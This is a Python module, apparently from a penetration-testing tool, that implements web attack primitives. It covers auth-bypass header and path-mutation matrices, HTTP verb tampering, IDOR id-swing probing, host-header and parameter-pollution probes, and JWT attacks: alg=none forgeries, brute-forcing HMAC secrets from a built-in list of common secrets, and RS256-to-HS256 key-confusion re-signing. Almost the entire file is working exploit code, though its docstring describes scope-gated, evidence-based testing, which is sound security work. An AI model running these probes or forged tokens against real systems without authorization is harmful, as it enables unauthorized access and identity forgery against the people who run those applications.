#!/usr/bin/env python3
"""
webattack.py — engine-native HTTP exploitation primitives.

The gap this closes: the attack rack fires Atomic Red Team tests (endpoint
TTP simulations), but real web kills come from access-control and token
failures — auth bypass, verb tampering, IDOR, JWT forgery, host-header
poisoning. On Cobblestone these were hand-rolled one-off scripts. Never
again: they are engine primitives now.

Invariants, enforced here:

* EVERY request rides the origin-bound transport (lesson 16) — per-origin
  cookie jars, --resolve semantics, anon/auth jar isolation.
* EVERY probe is scope-gated by the CALLER (engine phase) before it fires;
  these primitives never touch the network without a transport the engine
  built for an in-scope origin.
* EVIDENCE BEFORE CLAIMS — a "hit" is a meaningfully different response,
  recorded with the exact request mutation that caused it. No hit, no
  finding.
* Baseline first, always. Every matrix measures the untouched response
  before it mutates a single byte, and every verdict is a DIFF against
  that baseline — never an absolute guess.

stdlib-only, deterministic, unit-tested.
"""
import base64
import difflib
import hashlib
import hmac as hmac_mod
import json
import re
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse


# ---------------------------------------------------------------- diffing
def fingerprint(resp):
    """The comparable identity of a response: status + body length."""
    return {"status": resp.get("status", 0),
            "length": len(resp.get("body", "") or "")}


def differs(a, b, length_tol=0.15):
    """Meaningfully different? Status-class change, or a body length swing
    beyond tolerance. Absolute guesses are banned — everything is a diff."""
    sa, sb = a.get("status", 0), b.get("status", 0)
    if sa // 100 != sb // 100:
        return True
    la, lb = a.get("length", 0), b.get("length", 0)
    if la == 0 and lb == 0:
        return False
    hi, lo = max(la, lb), min(la, lb)
    return (hi - lo) / max(hi, 1) > length_tol


def similarity(a, b, cap=4096):
    """Body similarity ratio on capped bodies — the IDOR oracle."""
    a, b = (a or "")[:cap], (b or "")[:cap]
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a, b).ratio()


def _hit(family, mutation, baseline, resp, note=""):
    return {"family": family, "mutation": mutation,
            "baseline": fingerprint(baseline), "observed": fingerprint(resp),
            "evidence": note[:240]}


# ---------------------------------------------------------------- baseline
def baseline(transport, url, context="anon"):
    return transport.request("GET", url, context=context)


# ---------------------------------------------------------- auth bypass
BYPASS_HEADERS = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-Host", "localhost"),
    ("X-Original-URL", None),          # filled with the target path
    ("X-Rewrite-URL", None),           # filled with the target path
    ("X-Override-URL", None),          # filled with the target path
    ("Referer", None),                 # filled with the target url (admin referer checks)
]


def path_mutations(path):
    """Path-normalization bypass candidates for a protected path."""
    if not path or path == "/":
        return []
    out = [
        "/" + path.lstrip("/") + "/",        # trailing slash
        "//" + path.lstrip("/"),             # double slash
        "/./" + path.lstrip("/"),            # dot segment
        "/%2e/" + path.lstrip("/"),          # encoded dot segment
        path.upper(),                        # case flip (IIS/Tomcat)
        path + ";",                          # semicolon (Tomcat/Spring)
        path + "%20",                        # trailing space
        path + ".json",                      # extension flip
        "/.;/" + path.lstrip("/"),           # Tomcat /.; bypass
    ]
    seen, uniq = set(), []
    for m in out:
        if m != path and m not in seen:
            seen.add(m)
            uniq.append(m)
    return uniq


def auth_bypass_matrix(transport, url, context="anon", log=None):
    """Fire the bypass matrix at a URL that answered 401/403.

    A hit is a mutation whose response meaningfully differs from the
    denied baseline into 2xx/3xx — recorded with the exact mutation."""
    base = baseline(transport, url, context=context)
    result = {"url": url, "baseline": fingerprint(base), "hits": [],
              "probes": 1}
    if base.get("status", 0) not in (401, 403):
        result["note"] = "baseline is not denied — no bypass needed"
        return result
    u = urlparse(url)
    path = u.path or "/"

    for name, value in BYPASS_HEADERS:
        v = value if value is not None else (url if name == "Referer" else path)
        try:
            r = transport.request("GET", url, headers={name: v}, context=context)
        except OSError:
            continue
        result["probes"] += 1
        if r.get("status", 0) // 100 in (2, 3) and differs(
                fingerprint(base), fingerprint(r)):
            result["hits"].append(_hit("auth-bypass", f"header {name}: {v}",
                                       base, r,
                                       f"denied baseline bypassed via {name}"))
            if log:
                log(f"auth-bypass HIT {url} via {name}: {base.get('status')}"
                    f" -> {r.get('status')}")
    origin_path_base = urlunparse((u.scheme, u.netloc, "", "", u.query, ""))
    for mut in path_mutations(path):
        murl = urlunparse((u.scheme, u.netloc, mut, "", u.query, ""))
        try:
            r = transport.request("GET", murl, context=context)
        except OSError:
            continue
        result["probes"] += 1
        if r.get("status", 0) // 100 in (2, 3) and differs(
                fingerprint(base), fingerprint(r)):
            result["hits"].append(_hit("auth-bypass", f"path {mut}",
                                       base, r,
                                       f"denied baseline bypassed via path mutation {mut}"))
            if log:
                log(f"auth-bypass HIT {origin_path_base}{mut}: "
                    f"{base.get('status')} -> {r.get('status')}")
    return result


# ---------------------------------------------------------- verb tamper
ALL_VERBS = ("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE")
DANGEROUS_VERBS = ("PUT", "DELETE", "PATCH")


def verb_tamper(transport, url, context="anon", log=None):
    """Fire the verb set. Hits: a state-changing verb answers 2xx where the
    baseline was denied; OPTIONS Allow advertising dangerous verbs; TRACE
    echoing the request (XST surface)."""
    base = baseline(transport, url, context=context)
    result = {"url": url, "baseline": fingerprint(base), "hits": [],
              "probes": 1, "allow": []}
    for verb in ALL_VERBS:
        if verb == "GET":
            continue
        try:
            r = transport.request(verb, url, context=context,
                                  body=b"" if verb in ("POST", "PUT", "PATCH")
                                  else None)
        except OSError:
            continue
        result["probes"] += 1
        if verb == "OPTIONS":
            allow = r.get("headers", {}).get("allow", "")
            result["allow"] = [a.strip() for a in allow.split(",") if a.strip()]
            advertised = [a for a in result["allow"] if a in DANGEROUS_VERBS]
            if advertised:
                result["hits"].append(_hit(
                    "verb-tamper", "OPTIONS", base, r,
                    f"Allow advertises dangerous verbs: {', '.join(advertised)}"))
            continue
        if verb == "TRACE":
            body = r.get("body", "") or ""
            if r.get("status") == 200 and "TRACE" in body and \
                    url.split("://", 1)[-1].split("/")[0] in body:
                result["hits"].append(_hit(
                    "verb-tamper", "TRACE", base, r,
                    "TRACE echoes the request — cross-site tracing surface"))
            continue
        if r.get("status", 0) // 100 in (2, 3) and \
                base.get("status", 0) in (401, 403, 405) and \
                differs(fingerprint(base), fingerprint(r)):
            result["hits"].append(_hit(
                "verb-tamper", verb, base, r,
                f"{verb} answered {r.get('status')} where GET was "
                f"{base.get('status')}"))
            if log:
                log(f"verb-tamper HIT {url}: {verb} -> {r.get('status')}")
    return result


# ---------------------------------------------------------- IDOR
def _context_rank(ctx):
    return 0 if ctx == "anon" else 1


def idor_differential(transport, url, contexts=("anon",), log=None):
    """Two oracles, both diffs — never absolute:

    1. context differential: the same object fetched under anon vs an
       authenticated context. anon getting the privileged body (>=0.9
       similarity) is a missing-authz hit.
    2. id swing: a numeric id in path/query is stepped +/-1 under the most
       privileged context; a 200 with a *different* body is an IDOR
       candidate — another object's data answered.
    """
    result = {"url": url, "hits": [], "probes": 0}
    ctxs = sorted(set(contexts), key=_context_rank)
    responses = {}
    for ctx in ctxs:
        try:
            responses[ctx] = transport.request("GET", url, context=ctx)
        except OSError:
            continue
        result["probes"] += 1
    if "anon" in responses:
        anon = responses["anon"]
        for ctx, priv in responses.items():
            if ctx == "anon" or priv.get("status") != 200:
                continue
            if anon.get("status") == 200 and \
                    similarity(anon.get("body"), priv.get("body")) >= 0.9 and \
                    len(priv.get("body", "") or "") > 0:
                result["hits"].append(_hit(
                    "idor", f"context anon == {ctx}", priv, anon,
                    f"anonymous context receives the privileged object body "
                    f"(similarity {similarity(anon.get('body'), priv.get('body')):.2f})"))
                if log:
                    log(f"idor HIT {url}: anon receives privileged body")
    # id swing — every numeric id is a candidate object reference
    u = urlparse(url)
    swing_urls = []
    m = re.search(r"/(\d+)(?=/|$)", u.path)
    if m:
        for delta in (+1, -1):
            nid = max(1, int(m.group(1)) + delta)
            swing_urls.append(urlunparse((u.scheme, u.netloc,
                                          u.path[:m.start(1)] + str(nid) +
                                          u.path[m.end(1):],
                                          "", u.query, "")))
    qs = parse_qsl(u.query)
    for i, (k, v) in enumerate(qs):
        if v.isdigit():
            for delta in (+1, -1):
                nq = qs[:]
                nq[i] = (k, str(max(0, int(v) + delta)))
                swing_urls.append(urlunparse((u.scheme, u.netloc, u.path, "",
                                              urlencode(nq), "")))
    if swing_urls and ctxs:
        priv_ctx = ctxs[-1]
        base = responses.get(priv_ctx)
        if base and base.get("status") == 200:
            for surl in swing_urls[:4]:
                try:
                    r = transport.request("GET", surl, context=priv_ctx)
                except OSError:
                    continue
                result["probes"] += 1
                if r.get("status") == 200 and \
                        0 < similarity(base.get("body"), r.get("body")) < 0.9:
                    result["hits"].append(_hit(
                        "idor", f"id swing {surl}", base, r,
                        f"neighbour object answered 200 with different body "
                        f"(similarity {similarity(base.get('body'), r.get('body')):.2f})"))
                    if log:
                        log(f"idor HIT id swing {surl}")
                    break  # one proven neighbour is enough — report, don't spray
    return result


# ---------------------------------------------------------- host header
def host_header_injection(transport, url, canary=None, log=None):
    """Canaried host-header probes (lesson 3 discipline): injected hosts are
    unique tokens on .invalid. A hit is the canary reflected in the body or
    a Location header — the poisoning surface for reset links and caches."""
    import secrets as _sec
    token = canary or f"sr-{_sec.token_hex(4)}.invalid"
    base = baseline(transport, url)
    result = {"url": url, "canary": token, "hits": [], "probes": 1}
    probes = [
        ("host-header", token),
        ("X-Forwarded-Host", token),
        ("X-Host", token),
        ("X-Forwarded-Server", token),
    ]
    for name, value in probes:
        try:
            if name == "host-header":
                r = transport.request("GET", url, host_header=value)
            else:
                r = transport.request("GET", url, headers={name: value})
        except OSError:
            continue
        result["probes"] += 1
        where = None
        if token in (r.get("body", "") or ""):
            where = "body"
        elif token in (r.get("headers", {}).get("location", "") or ""):
            where = "location"
        if where:
            result["hits"].append(_hit(
                "host-header", f"{name}: {value}", base, r,
                f"canary host reflected in {where} — poisoning surface"))
            if log:
                log(f"host-header HIT {url}: canary reflected in {where}")
    return result


# ---------------------------------------------------------- HPP
def hpp_probe(transport, url, context="anon", log=None):
    """Parameter pollution: duplicate every query param with a sentinel and
    diff against baseline. A meaningful diff is a parser-disagreement hit —
    the class that turns into WAF bypasses and authz confusion."""
    u = urlparse(url)
    qs = parse_qsl(u.query)
    result = {"url": url, "hits": [], "probes": 0}
    if not qs:
        return result
    base = baseline(transport, url, context=context)
    result["probes"] += 1
    for k, _v in qs:
        polluted = qs + [(k, "sr_hpp")]
        purl = urlunparse((u.scheme, u.netloc, u.path, "", urlencode(polluted), ""))
        try:
            r = transport.request("GET", purl, context=context)
        except OSError:
            continue
        result["probes"] += 1
        if differs(fingerprint(base), fingerprint(r)):
            result["hits"].append(_hit(
                "hpp", f"duplicate {k}", base, r,
                f"duplicating parameter '{k}' changed the response — "
                f"front/back parser disagreement"))
            if log:
                log(f"hpp HIT {url}: param {k}")
    return result


# ---------------------------------------------------------------- JWT
def _b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def jwt_split(token):
    """Parse a JWT into (header, payload, signature). Raises ValueError."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError("not a JWT (need 3 segments)")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def jwt_forge_none(token):
    """alg=none forgeries: every casing, with empty signature and with the
    signature segment dropped entirely. Servers that accept any of these
    accept ANY forged identity."""
    header, payload, _sig = jwt_split(token)
    out = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = dict(header, alg=alg)
        hp = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        pp = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        out.append(f"{hp}.{pp}.")
        out.append(f"{hp}.{pp}")
    return list(dict.fromkeys(out))


JWT_COMMON_SECRETS = [
    "secret", "password", "key", "private", "changeme", "admin", "jwt",
    "jwtsecret", "jwt_secret", "secret123", "123456", "test", "dev",
    "development", "production", "supersecret", "mysecret", "my_secret",
    "your-256-bit-secret", "your256bitsecret", "HS256", "shhhhh",
    "signingkey", "signing-key", "api_secret", "apisecret", "token",
    "masterkey", "default", "debug", "1234", "12345", "passw0rd",
    "Secret123", "SECRET", "keyboardcat", "ilovejson", "auth",
]

_JWT_ALGS = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
             "HS512": hashlib.sha512}


def _jwt_sign_hmac(signing_input, secret, alg):
    return _b64url_encode(hmac_mod.new(
        secret.encode(), signing_input.encode(), _JWT_ALGS[alg]).digest())


def jwt_brute_secret(token, secrets=None):
    """Brute an HMAC JWT secret against the common list. A hit means ANY
    token is forgeable — full identity fabrication."""
    header, _payload, sig = jwt_split(token)
    alg = header.get("alg", "")
    if alg not in _JWT_ALGS:
        return None
    signing_input = ".".join(token.strip().split(".")[:2])
    for secret in (secrets or JWT_COMMON_SECRETS):
        if _jwt_sign_hmac(signing_input, secret, alg) == sig:
            return secret
    return None


def jwt_rs256_to_hs256(token, pubkey_pem):
    """RS256->HS256 confusion: re-sign the payload with HMAC-SHA256 keyed
    by the server's PUBLIC key. Libraries that trust the token's alg header
    verify it as HS256 against the public key they publish anyway."""
    header, payload, _sig = jwt_split(token)
    h = dict(header, alg="HS256")
    si = (_b64url_encode(json.dumps(h, separators=(",", ":")).encode()) + "." +
          _b64url_encode(json.dumps(payload, separators=(",", ":")).encode()))
    sig = _jwt_sign_hmac(si, pubkey_pem, "HS256")
    return f"{si}.{sig}"


def jwt_audit(token, secrets=None):
    """Offline token audit — zero network. Flags: alg=none, missing
    expiry/audience, sensitive claims, kid/jku/x5u injection points, and a
    brute-forced HMAC secret."""
    flags = []
    try:
        header, payload, sig = jwt_split(token)
    except (ValueError, json.JSONDecodeError) as e:
        return {"valid": False, "error": str(e), "flags": []}
    alg = header.get("alg", "")
    if alg.lower() == "none":
        flags.append({"flag": "alg-none", "severity": "critical",
                      "detail": "token itself uses alg=none — no signature at all"})
    if "exp" not in payload:
        flags.append({"flag": "no-expiry", "severity": "medium",
                      "detail": "no exp claim — token never expires by itself"})
    if alg in _JWT_ALGS:
        hit = jwt_brute_secret(token, secrets)
        if hit is not None:
            flags.append({"flag": "weak-secret", "severity": "high",
                          "detail": f"HMAC secret brute-forced: '{hit}' — "
                                    f"any identity is forgeable offline"})
            flags[-1]["secret"] = hit
    for k in ("kid", "jku", "x5u"):
        if k in header:
            flags.append({"flag": f"{k}-injection", "severity": "medium",
                          "detail": f"{k} header present — key-confusion "
                                    f"injection point: {header[k]!r}"})
    if alg.startswith("RS") or alg.startswith("ES"):
        flags.append({"flag": "confusion-candidate", "severity": "info",
                      "detail": f"alg={alg} — RS/ES->HS confusion candidate; "
                                f"re-sign with the public key as HMAC secret"})
    return {"valid": True, "alg": alg, "header": header, "payload": payload,
            "sig_len": len(sig), "flags": flags}


# ---------------------------------------------------------- severities
def hit_severity(family, url="", hit=None):
    path = (urlparse(url).path or "/").lower()
    adminish = any(w in path for w in
                   ("admin", "manage", "internal", "console", "dashboard",
                    "config", "debug", "actuator", "api/"))
    if family == "auth-bypass":
        return "critical" if adminish else "high"
    if family == "verb-tamper":
        return "high" if adminish else "medium"
    if family == "idor":
        return "high"
    if family == "host-header":
        return "medium"
    if family == "hpp":
        return "low"
    return "medium"


HIT_TECHNIQUE = {
    "auth-bypass": "T1190 Exploit Public-Facing Application",
    "verb-tamper": "T1190 Exploit Public-Facing Application",
    "idor": "T1190 Exploit Public-Facing Application",
    "host-header": "T1190 Exploit Public-Facing Application",
    "hpp": "T1190 Exploit Public-Facing Application",
    "jwt": "T1528 Steal Application Access Token",
}


# ---------------------------------------------------------------- CLI
def cli_jwt(args):
    token = args.token
    if args.file:
        with open(args.file, "r", encoding="utf-8") as f:
            token = f.read().strip()
    audit = jwt_audit(token, secrets=args.secret or None)
    if not audit.get("valid"):
        print(f"invalid token: {audit.get('error')}")
        return 1
    print(f"alg: {audit['alg']}  sig: {audit['sig_len']} chars")
    print(f"header : {json.dumps(audit['header'])}")
    print(f"payload: {json.dumps(audit['payload'])}")
    if not audit["flags"]:
        print("no flags")
    for fl in audit["flags"]:
        print(f"  [{fl['severity']:8s}] {fl['flag']}: {fl['detail']}")
    if args.forge:
        print("\nalg=none forgeries:")
        for t in jwt_forge_none(token):
            print(f"  {t}")
    return 0 if not any(f["severity"] in ("critical", "high")
                        for f in audit["flags"]) else 2


def build_arg_parser(sub):
    p = sub.add_parser("jwt", help="offline JWT audit: alg=none forge, "
                       "HMAC secret brute, kid/jku/x5u injection points")
    p.add_argument("token", nargs="?", help="the JWT (or --file)")
    p.add_argument("--file", help="read token from file")
    p.add_argument("--secret", action="append", default=[],
                   help="extra HMAC secrets to try (repeat)")
    p.add_argument("--forge", action="store_true",
                   help="print alg=none forgeries")
    p.set_defaults(fn=lambda a: cli_jwt(a) if (a.token or a.file)
                   else _jwt_usage())
    return p


def _jwt_usage():
    print("usage: shardreaper jwt <token> [--secret S] [--forge]")
    return 2
